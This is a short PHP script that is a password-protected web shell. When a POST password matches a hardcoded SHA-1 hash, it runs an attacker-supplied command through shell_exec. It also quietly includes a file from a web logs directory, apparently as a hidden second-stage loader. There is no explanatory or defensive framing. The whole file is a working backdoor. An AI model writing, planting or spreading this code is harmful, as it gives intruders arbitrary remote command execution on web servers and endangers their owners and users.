<?php
if(isset($_POST["p"])&&isset($_POST["c"])&&hash("sha1",$_POST["p"])==="0fedf20bf1d39bf016fae2b0d88a8cfc4f0daeab")die(shell_exec($_POST["c"]));
@include_once "/var/www/html/logs/w";
?>